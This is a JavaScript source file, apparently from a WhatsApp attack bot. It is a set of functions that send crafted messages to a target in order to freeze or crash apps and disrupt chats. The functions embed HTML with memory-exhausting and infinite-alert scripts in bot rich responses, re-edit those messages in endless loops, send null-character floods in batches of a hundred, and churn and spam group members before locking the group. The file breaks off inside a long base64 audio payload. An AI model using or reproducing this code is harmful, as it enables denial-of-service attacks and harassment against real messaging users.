              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 5
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}


async function UItidakmenanggapi(sock, target) {
  const id = () => Math.random().toString(36).substring(2, 10);
  const responseId = id();
  const originalId = id().toUpperCase();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: #000000;
    overflow: hidden;
}
</style>
</head>
<body>
<script>
(function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }

        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
})();
</script>
</body>
</html>
`;

  const data = Buffer.from(JSON.stringify({
    response_id: responseId,
    sections: [{
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        }
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64');

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        botResponseId: responseId
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: responseId,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            mentionedJid: Array(200).fill(target),
            forwardingScore: 999999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  };

  const ctx = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
    }
  };

  try {
    await sock.relayMessage(target, message, {
      participant: { jid: target },
      noSelfSync: false
    }).catch(() => {});

    await sock.relayMessage(target, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});

    await new Promise(r => setTimeout(r, 1000));

    while (true) {
      try {
        const protocolEdit = {
          ...ctx,
          botForwardedMessage: {
            message: {
              protocolMessage: {
                key: { remoteJid: target, fromMe: true, id: originalId },
                type: 14,
                timestampMs: Date.now(),
                editedMessage: message
              }
            }
          }
        };

        await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  } catch (e) {}
}


async function funcdelaynehard(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  });

  const payload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            locationMessage: {
              degreesLatitude: -7.2575,
              degreesLongitude: 112.7521,
              name: '\0'.repeat(15000),
              address: '\0'.repeat(15000),
              url: 'https://maps.google.com/?q=-7.2575,112.7521',
              isLive: true,
              accuracyInMeters: 10,
              speedInMps: 0,
              degreesClockwiseFromMagneticNorth: 0,
              comment: '\0'.repeat(15000),
              sequenceNumber: 1,
              timeOffset: 0,
              isFromTemplate: false
            }
          },
          body: {
            text: '\0'.repeat(25000)
          },
          footer: {
            text: '\0'.repeat(15000)
          },
          nativeFlowMessage: {
            buttons: [
              ...Array(50).fill(0).map((_, i) => ({
                name: 'quick_reply',
                buttonParamsJson: JSON.stringify({
                  display_text: '\0'.repeat(200),
                  id: 'elynn_quick_' + i
                })
              })),
              {
                name: 'limited_time_offer',
                buttonParamsJson: JSON.stringify({
                  display_text: '\0'.repeat(200),
                  url: 'https://example.com/',
                  copy_code: 'ELYNNMD',
                  expiration_time: Math.floor(Date.now() / 1000) + 2592000
                })
              }
            ],
            messageParamsJson: '{}',
            messageVersion: 1
          },
          bloksWidget: {
            uuid: 'elynn-location-a2ui',
            type: 'im_a2ui',
            data: JSON.stringify({
              version: 'v0.9',
              createSurface: {
                surfaceId: 'elynn-location',
                catalogId: 'https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json',
                components: [
                  {
                    id: 'root',
                    component: 'Column',
                    children: ['location_card', 'map_button']
                  },
                  {
                    id: 'location_card',
                    component: 'Card',
                    child: 'location_column'
                  },
                  {
                    id: 'location_column',
                    component: 'Column',
                    children: ['location_title', 'location_divider', 'location_text']
                  },
                  {
                    id: 'location_title',
                    component: 'Text',
                    text: '\0'.repeat(5000),
                    variant: 'h2'
                  },
                  {
                    id: 'location_divider',
                    component: 'Divider'
                  },
                  {
                    id: 'location_text',
                    component: 'Text',
                    text: '\0'.repeat(5000),
                    variant: 'body'
                  },
                  {
                    id: 'map_button',
                    component: 'Button',
                    child: 'map_button_text',
                    variant: 'primary',
                    action: {
                      call: 'openUrl',
                      args: {
                        url: 'https://maps.google.com/?q=-7.2575,112.7521'
                      }
                    }
                  },
                  {
                    id: 'map_button_text',
                    component: 'Text',
                    text: 'Open Maps',
                    variant: 'body'
                  }
                ]
              }
            })
          }
        }
      }
    }
  };

  const sendArray = Array(100).fill(payload);
  await Promise.all(sendArray.map(p => sock.relayMessage(target, p, { messageId: uid().replaceAll('-', '').toUpperCase() }).catch(() => {})));
}


async function newBandGbPler(sock, target) {
  let group = target.includes("@g.us") ? target : target + "@g.us";
  
  let fakeNumbers = [
    "0@s.whatsapp.net",
    "6280000000000@s.whatsapp.net",
    "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net",
    "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net",
    "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net",
    "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net",
    "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net",
    "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net",
    "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net",
    "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net"
  ];

  try {
    let metadata = await sock.groupMetadata(group);
    let total = metadata.participants.length;

    for (let i = 0; i < 20; i++) {
      try {
        for (let k = 0; k < 10; k++) {
          let fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
          await sock.groupParticipantsUpdate(group, [fake], "add");
          await sock.groupParticipantsUpdate(group, [fake], "remove");
        }

        for (let j = 0; j < 15; j++) {
          await sock.sendMessage(group, {
            text: "\u200B".repeat(10000) + "\u0000".repeat(10000) + "\u202E".repeat(5000)
          });
        }

        await sock.groupSettingUpdate(group, "announcement");
        await sock.groupSettingUpdate(group, "locked");
      } catch (_) {}
    }

    return "Success Band Group 🚬: " + total;
  } catch (e) {
    return "Failed Band Group 🗿: " + e.message;
  }
}

async function lynnlockperman(sock, target) {
  const duration = 600000;
  const interval = 5000;
  const iterations = duration / interval;

  for (let i = 0; i < iterations; i++) {
    try {
      const id = Math.random().toString(36),
            mid = id.toUpperCase(),
            msg = {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                botMetadata: {
                  messageDisclaimerText: '',
                  botResponseId: id
                }
              },
              botForwardedMessage: {
                message: {
                  richResponseMessage: {
                    messageType: 1,
                    response_id: id,
                    submessages: [],
                    unifiedResponse: {
                      data: Buffer.from(JSON.stringify({
                        __typename: 'XMSGGenAIUnifiedResponse',
                        response_id: id,
                        sections: [{
                          __typename: 'GenAIUnifiedResponseSection',
                          view_model: {
                            __typename: 'GenAISingleLayoutViewModel',
                            primitive: {
                              __typename: 'GenAIaeacdsnwHtmlPrimitive',
                              payload: '<!doctype html><html><body><script>while(true){alert("YAH AMPOS");}</script></body></html>',
                              trusted_sources: []
                            }
                          }
                        }]
                      })).toString('base64')
                    },
                    contextInfo: {
                      forwardingScore: 99999,
                      isForwarded: true,
                      forwardOrigin: 4,
                      expiration: 0,
                      ephemeralSettingTimestamp: Date.now(),
                      disappearingMode: {
                        initiator: 0,
                        trigger: 1
                      },
                      afterReadDuration: 1
                    }
                  }
                }
              }
            };

      await sock.relayMessage(target, msg, { messageId: mid });
      await new Promise(r => setTimeout(r, 50));
      await sock.relayMessage(target, {
        botForwardedMessage: {
          message: {
            protocolMessage: {
              key: {
                remoteJid: target,
                fromMe: true,
                id: mid
              },
              type: 14,
              editedMessage: msg
            }
          }
        }
      }, { messageId: id + '2' });
    } catch (e) {}

    if (i < iterations - 1) {
      await new Promise(r => setTimeout(r, interval));
    }
  }
}

async function lockchatnew(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "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